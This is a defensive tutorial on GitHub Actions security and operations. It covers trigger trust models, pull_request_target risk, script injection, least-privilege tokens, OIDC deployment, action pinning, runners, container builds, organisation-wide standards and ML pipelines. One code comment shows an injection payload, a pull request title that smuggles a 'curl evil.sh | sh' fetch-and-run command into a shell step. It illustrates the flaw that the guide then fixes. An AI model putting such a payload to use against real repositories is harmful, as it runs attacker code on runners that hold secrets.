Up to this point the question has been "how do I make this work". From here the questions are different: who is allowed to make my pipeline run, what credentials does it hold while it runs, what would an attacker do with a pull request, and how do sixty repositories share one standard without sixty copies of it.

This is the level where mistakes have consequences beyond a red build. I am going to start with security, because it is both the highest-stakes topic and the one most engineers reach senior roles without properly understanding.

## The trust model, which is the whole ballgame

Every workflow run has three properties that together determine your exposure: **whose code executes**, **whether secrets are present**, and **what the token can do**. Most real GitHub Actions vulnerabilities are a case of those three lining up badly.

| Trigger | Executes code from | Secrets available | Token |
|---|---|---|---|
| `push` | Your repository | Yes | As configured |
| `pull_request`, same-repo branch | Your repository | Yes | As configured |
| `pull_request` from a **fork** | The fork | **No** | Read-only |
| `pull_request_target` | The **base** repository | **Yes** | Write-capable |
| `workflow_run` | The base repository | Yes | Write-capable |
| `issue_comment` | The base repository | Yes | Write-capable |

Read that table until the pattern is obvious: GitHub deliberately makes fork pull requests harmless by withholding secrets and downgrading the token. The dangerous triggers are the ones that deliberately undo that protection because a maintainer needed to label a pull request or post a comment.

<div class="callout warn">
  <span class="ct">The single most dangerous pattern in GitHub Actions</span>
  <code>pull_request_target</code> combined with checking out <code>github.event.pull_request.head.sha</code>. That executes <b>untrusted fork code</b> in a job that <b>holds your secrets and a writable token</b>. Any build script, test fixture, or lifecycle hook in the fork can print every secret you own. It is not a theoretical risk — it is how numerous real repositories have been compromised.
</div>

If you genuinely need `pull_request_target`, there are two safe shapes. Either never check out the head ref at all — use the trigger only to read metadata and label or comment. Or split the work in two: an unprivileged `pull_request` job builds and produces an artifact, and a separate `workflow_run` job consumes that artifact without ever executing fork code.

```yaml
# Safe: reads metadata from the event, never runs fork code
on: pull_request_target
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5     # no checkout of head.sha anywhere
```

### Script injection

The second class of vulnerability is simpler and even more common. Event data is attacker-controlled text, and interpolating it into a shell means interpolating it into *source code*.

```yaml
# Vulnerable. A pull request titled  "; curl evil.sh | sh ;  executes on your runner
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe. The value arrives as data through the environment, never as shell source
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

The rule is absolute and easy to apply: **`${{ github.event.* }}` never appears inside a `run` body.** Branch names, issue titles, comment bodies, commit messages, and author names are all attacker-controlled. Route them through `env` and quote the variable.

## Least privilege for the token

`GITHUB_TOKEN` is minted per job, scoped to that repository, and expires when the job ends — which is good design. What is not automatic is its *scope*.

```yaml
permissions:
  contents: read              # a read-only floor for the whole workflow

jobs:
  release:
    permissions:
      contents: write         # widened for exactly one job
      packages: write
      id-token: write
    runs-on: ubuntu-latest
```

The mechanic that makes this powerful: **declaring any scope sets every undeclared scope to `none`.** So a single `contents: read` line at the top of a workflow removes the token's ability to push, tag, comment, or publish, and you then grant back only what a specific job needs.

Set the organisation default to read-only contents and make workflows opt in. That one setting makes every new repository in the organisation safe by default rather than dependent on each author remembering.

Two limits are worth knowing because they drive real architecture. A reusable workflow receives the **caller's** token, so its `permissions` can never exceed the caller's. And `GITHUB_TOKEN` cannot reach another repository at all — cross-repository automation needs a GitHub App installation token or a fine-grained personal access token.

On which of those to choose: prefer the **GitHub App**. A personal access token carries a human's full access, does not expire with the job, and shows up in the audit trail as that person rather than as automation. An App installation token is scoped, short-lived, and attributable.

## Deploying without storing credentials

Long-lived cloud keys in repository secrets are the default that everyone starts with and nobody should keep. They do not expire, they are a rotation task you will forget, and anyone who can add a workflow to the repository can use them.

OIDC removes them entirely. The runner requests a short-lived signed token describing itself, and your cloud provider exchanges that for temporary credentials.

```yaml
permissions:
  id-token: write             # allow the job to request an identity token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: aws sts get-caller-identity     # prove the identity before deploying
```

<div class="guide-timeline">
  <div class="guide-timeline-item"><span>1</span><strong>The job requests a token</strong><small>GitHub signs a short-lived JWT whose claims describe the repository, ref, environment, and workflow.</small></div>
  <div class="guide-timeline-item"><span>2</span><strong>The cloud verifies the signature</strong><small>GitHub's OIDC provider is registered once as a trusted identity provider in the account.</small></div>
  <div class="guide-timeline-item"><span>3</span><strong>The trust policy inspects the claims</strong><small>This is the part that actually matters, and the part that is usually wrong.</small></div>
  <div class="guide-timeline-item"><span>4</span><strong>Temporary credentials are issued</strong><small>Valid for the job and then gone. Nothing to rotate, nothing to leak, nothing to steal from a log.</small></div>
</div>

<div class="callout warn">
  <span class="ct">Where OIDC is almost always misconfigured</span>
  A trust policy matching <code>repo:my-org/*:*</code> means <b>any branch of any repository in the organisation</b> can assume that role — including a branch an attacker opens a pull request from. Constrain the <code>sub</code> claim: <code>repo:my-org/my-repo:ref:refs/heads/main</code>, or better <code>repo:my-org/my-repo:environment:production</code>, which makes the environment's approval gate part of the identity itself.
</div>

Verify the constraint rather than trusting it. Open a pull request from a throwaway branch with a workflow that tries to assume the role. It should be refused. If it succeeds, your condition is too broad and the approval gate is decorative.

## Supply chain

A `uses:` line is a decision to execute somebody else's code inside a job that may hold your credentials. Treat it accordingly.

| Control | Removes |
|---|---|
| Pin third-party actions to a full commit SHA | A moving tag being repointed at malicious code |
| Dependabot on `github-actions` | Those pins going stale and unpatched |
| Organisation policy allowing only selected actions | An unvetted action entering through any repository |
| Vendor critical actions into your own organisation | Dependence on an account you do not control |
| `permissions: contents: read` by default | A compromised step's ability to push |
| Environment protection on deploy jobs | Any automated path to production without review |
| Artifact attestations | Being unable to prove which workflow built an artifact |

```yaml
# The pin, with the human-readable version in a trailing comment
- uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v3.5.0
```

```yaml .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      actions:
        patterns: ['*']       # one pull request a week instead of fifteen
```

Note that pinning without updating is its own failure — a frozen action is an unpatched one. The two controls only work together.

Two less obvious surfaces are worth raising unprompted in any design discussion. **Caches are writable by pull requests**, so a branch can poison a cache that a later `main` run restores; never restore something and then execute it without verification. And **self-hosted runners on public repositories are dangerous**, because any fork pull request can execute code on a machine that persists between jobs.

## Runners, chosen deliberately

| Situation | Choice | Why |
|---|---|---|
| Public repository, ordinary CI | GitHub-hosted | Free minutes, fresh machine, no state to leak |
| Private repository, CPU-bound | Larger hosted runner | Same isolation model, more cores, no fleet to run |
| GPU work, licensed tooling, VPC-only service | Self-hosted, **ephemeral** | The only options that reach the hardware or network |
| Public repository with fork pull requests | Never self-hosted | Untrusted code plus persistent state |
| Many repositories needing one custom image | Hosted runner with `container:` | The image becomes the standard; the runner stays disposable |

If you do run self-hosted, the non-negotiables are: **ephemeral** — one job per runner, then destroy the VM or container; scoped to specific repositories rather than the whole organisation; in a network segment that cannot reach production directly; and never schedulable by a fork-triggered workflow.

On cost: Windows minutes are billed at roughly twice Linux and macOS at roughly ten times. A matrix that includes macOS "for completeness" can quietly become most of your bill, and larger hosted runners are almost always cheaper than the engineering time to operate your own fleet.

## Building containers properly

Container builds in CI are usually the slowest job in a pipeline, and layer caching is what fixes that.

```yaml
- uses: docker/setup-buildx-action@v3

- uses: docker/login-action@v3
  with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}

- uses: docker/build-push-action@v6
  with:
    push: ${{ github.event_name != 'pull_request' }}
    tags: |
      ghcr.io/${{ github.repository }}:${{ github.sha }}
      ghcr.io/${{ github.repository }}:latest
    cache-from: type=gha
    cache-to: type=gha,mode=max
    provenance: true
```

Buildx gives you BuildKit, which brings a real layer cache, multi-platform builds, and exportable cache backends. `type=gha` is the right cache for a single repository; a registry cache (`type=registry`) is right when many repositories or self-hosted runners should share layers. `mode=max` exports intermediate layers too — a bigger cache, and a dramatically better hit rate on multi-stage builds.

Two decisions in that snippet are about trust rather than speed. `push:` is false on pull requests, because a fork must never be able to publish to your registry — you build to verify and push only on merge. And the immutable `:${{ github.sha }}` tag means a deployed image is identifiable; a moving `:latest` is for humans, never for a deployment reference.

Multi-platform builds deserve a warning: `linux/arm64` under emulation is extremely slow. Use native ARM runners when it matters rather than accepting a fifteen-minute build.

## Extending the platform with your own actions

When a sequence of steps appears in many repositories, publish it. Three implementations exist and the choice has real consequences.

| Type | Runs as | Choose it for | Watch out for |
|---|---|---|---|
| Composite | Steps inside the caller's job | Packaging a repeated step sequence | `shell:` required on every `run` |
| JavaScript | Node on the runner | Real logic, API calls, cross-platform support | The bundled `dist/` must be committed |
| Docker container | A container on the runner | An arbitrary toolchain in any language | Linux runners only; image pull cost per job |

JavaScript actions start fastest and are the only kind that behaves identically on Linux, Windows, and macOS — but dependencies are not installed for you, so the action must be bundled with something like `@vercel/ncc` and the output committed. Docker actions are the most flexible and the slowest. Composite actions cannot define jobs, matrices, or their own runner; when you need any of those, you need a reusable workflow rather than an action.

Version a published action the way the ecosystem expects: release `v1.2.3`, and keep a mutable `v1` tag pointing at the newest compatible release.

```yaml action.yml
name: Deploy to our platform
description: Resolves the target environment and triggers a deployment
inputs:
  environment:
    description: Target environment name
    required: true
  wait:
    description: Block until the deployment settles
    default: 'true'
outputs:
  url:
    description: Public URL of the deployment
runs:
  using: node20
  main: dist/index.js
```

## Standardising across an organisation

This is the work that distinguishes a senior engineer from a good pipeline author: making one standard apply to sixty repositories without sixty copies of it.

<ol class="guide-steps">
  <li><b>One repository owns the standard</b>An organisation <code>.github</code> repository holding reusable workflows and composite actions, with CODEOWNERS on the workflow folder so changes are reviewed by the people who carry the pager.</li>
  <li><b>Version with a moving major tag</b>Consumers pin <code>@v2</code>. You release <code>v2.7.0</code> and move <code>v2</code>. A fix reaches every repository without sixty pull requests, and a breaking change becomes <code>v3</code> with a migration note rather than a silent surprise.</li>
  <li><b>Canary before you move the tag</b>One low-risk repository pins the exact patch release. When it has been green for a day, move the major tag. Without this step, a bad release breaks every team simultaneously.</li>
  <li><b>Treat inputs as a public API</b>Types, defaults, descriptions. Removing an input is a breaking change even if one repository used it, and the failure lands on someone else's pull request.</li>
  <li><b>Enforce the boundary with policy, not documentation</b>Organisation settings restricting which actions may run, required checks in branch protection, and required review on workflow files. A standard that depends on everyone remembering is not a standard.</li>
  <li><b>Make the fast path the compliant path</b>If using the shared workflow is easier than writing your own, adoption takes care of itself. If it is harder, teams will fork it and you will have sixty variants again.</li>
</ol>

## Observability: knowing whether CI is actually healthy

"CI is slow" is an opinion. Numbers make it a priority, and there are only four you need.

| Signal | Where it comes from |
|---|---|
| Median and p95 duration per workflow | The REST API for workflow runs |
| Failure rate, split into real failures and flakes | Run conclusions plus re-run counts |
| Queue time | The gap between run creation and job start |
| Cost by workflow and runner label | Actions usage metrics |

Alongside those, two per-run tools matter. **Job summaries** — Markdown written to `$GITHUB_STEP_SUMMARY` — put the numbers a reviewer needs directly on the run page. And **step timestamps** in the run view find the slow step in seconds.

Be careful with debugging actions that open an interactive shell on the runner. They are genuinely useful and they are also a live session on a machine holding your secrets; restrict them to jobs that have none.

## Machine-learning delivery

If your pipelines build models rather than binaries, the shape changes. CI for software asks "does this work?"; CI for a model asks "is it good enough, and can I prove what produced it?"

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Carries over unchanged</h4>
    <ul>
      <li>Lint, type-check, and unit tests on the training code</li>
      <li>Dependency caching, matrices, artifacts</li>
      <li>Environments and approvals for promotion</li>
      <li>OIDC for cloud access</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>Genuinely new concerns</h4>
    <ul>
      <li>Data validation as a gate, not an afterthought</li>
      <li>Metric thresholds that fail the job rather than logging a number</li>
      <li>Comparison against the currently deployed model</li>
      <li>Lineage: which commit, dataset version, and run produced this artifact</li>
      <li>GPU runners, long jobs, and the six-hour job ceiling</li>
    </ul>
  </div>
</div>

The architectural answer, which you should state explicitly because it demonstrates judgement: **Actions is the orchestrator and the audit trail, not the compute.** It validates cheaply, submits work to a platform built for training, waits, gates on the returned metrics, and records the promotion. Proposing a six-hour GPU job on a hosted runner reads as inexperience.

```yaml .github/workflows/train.yml
name: Train and gate

on:
  workflow_dispatch:
    inputs:
      dataset:
        description: Dataset version to train on
        required: true
  schedule:
    - cron: '0 2 * * 1'

permissions:
  contents: read
  id-token: write

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11', cache: pip }
      - run: pip install -r requirements.txt
      - name: Validate before spending money on GPUs
        run: python -m pipeline.validate --dataset "${{ inputs.dataset }}"

  train:
    needs: validate
    runs-on: ubuntu-latest
    timeout-minutes: 60
    outputs:
      run-id: ${{ steps.submit.outputs.run-id }}
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.TRAINING_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - id: submit
        name: Submit to the platform built for this, and wait
        run: python -m pipeline.submit --wait --dataset "${{ inputs.dataset }}"

  gate:
    needs: train
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Compare against what is deployed today
        run: |
          python -m pipeline.compare \
            --candidate "${{ needs.train.outputs.run-id }}" \
            --baseline production \
            --min-delta 0.0
      - name: Put the numbers where the reviewer will see them
        if: always()
        run: python -m pipeline.summary >> "$GITHUB_STEP_SUMMARY"

  promote:
    needs: gate
    runs-on: ubuntu-latest
    environment: model-production
    permissions:
      id-token: write
      contents: read
    steps:
      - run: python -m pipeline.promote "${{ needs.train.outputs.run-id }}"
```

Four decisions in that file are the entire lesson. Validation happens on a cheap runner before an expensive one is provisioned. The gate is a **comparison against production**, not a hard-coded threshold, so it survives a changing dataset. Metrics go to the step summary so the approver does not download a zip. And promotion is a separate job behind an environment, which buys the approval, the scoped credentials, and a deployment record naming the commit and the run.

## Migrating from an existing CI system

You will be asked this. The answer that lands is a sequence, not a tool comparison.

Inventory the existing jobs first. Port the **leaf jobs** — the ones nothing depends on — first, because they prove the runner story, the network access, and the credential model with minimal risk. Run both systems in parallel with Actions non-blocking, so a gap in your port does not block anyone. Move the required checks over one at a time as each Actions job earns trust. Then decommission.

The important judgement: **do not port the old pipeline verbatim.** A great deal of Jenkinsfile logic exists to work around a persistent workspace and shared mutable state — problems Actions does not have. Reimplementing those workarounds imports complexity you no longer need.

## Where this leaves you

You should now be able to look at a workflow and see not just what it does but what it *permits*: which triggers give fork-influenced code a privileged token, what the token can reach, whether event data flows into a shell, whether a third-party action is pinned, and whether there is an automated path to production without a human. That review instinct is the most valuable thing on this page, because most incidents are prevented at review time rather than at runtime.
